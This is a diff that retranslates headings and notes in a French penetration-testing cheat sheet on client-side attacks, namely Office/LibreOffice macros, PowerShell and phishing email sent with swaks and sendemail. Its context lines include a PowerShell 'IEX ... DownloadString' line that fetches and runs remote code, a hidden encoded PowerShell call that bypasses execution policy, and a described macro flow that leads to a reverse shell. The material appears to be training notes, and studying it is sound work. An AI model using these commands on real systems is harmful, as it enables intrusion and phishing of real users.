@@ -8,7 +8,7 @@ description: "Comprendre les vecteurs d'interaction avec les postes utilisateurs
 Comprendre les vecteurs d'interaction avec les postes utilisateurs.
 
 
-## MACROS
+## Macros Office
 
 
 
@@ -159,7 +159,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 ```
 
 
-## Avancé Exploitation
+## Exploitation avancée
 
 
 
@@ -203,7 +203,7 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Avancé Exploitation ».</p>
+<p class="oscp-command-note">Script PowerShell pour l’exploitation avancée.</p>
 
 ```powershell
 # Utilisation des encodages
@@ -226,7 +226,7 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 ```
 
 
-<p class="oscp-command-note">Extrait JavaScript lié à « Avancé Exploitation ».</p>
+<p class="oscp-command-note">Exemple JavaScript pour l’exploitation avancée.</p>
 
 ```javascript
 var cmd = "";
@@ -286,7 +286,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 `--auth-user` · `--auth-password`  
 
 
-### Email avec des en-têtes personnalisés pour le génie social
+### E-mail avec en-têtes personnalisés (ingénierie sociale)
 
 
 <p class="oscp-command-note">Examiner la configuration SMTP.</p>
@@ -303,7 +303,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 `X-Priority` · `Importance`  
 
 
-### Autre outil envoyer un courriel
+### Autres outils pour envoyer un e-mail
 
 
 
@@ -320,7 +320,7 @@ sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
 `192.168.203.140:25` · `-u` · `-m` · `-a`  
 
 
-### Comparison Summary
+### Comparaison des méthodes
 
 
 **Authentification**
@@ -333,17 +333,17 @@ No · Yes · No · No
 Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only
 
 
-**SMTP Authentification**
+**Authentification SMTP**
 
 No · Yes · No · No
 
 
-**Social Engineering Usage**
+**Utilisation en ingénierie sociale**
 
 No · No · Yes (with custom headers) · No
 
 
-**Tool Complexity**
+**Complexité de l’outil**
 
 Moderate · Moderate · Moderate · Simple
 
@@ -443,7 +443,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 # Execution Flow:
 # 1. La cible ouvre le document LibreOffice.
 # 2. Lorsque la cible permet des macros, la charge utile est téléchargée et exécutée.
-# 3. A reverse shell connects to your Netcat listener.
+# 3. Le shell inversé se connecte au port d’écoute Netcat.
 
 ```
 
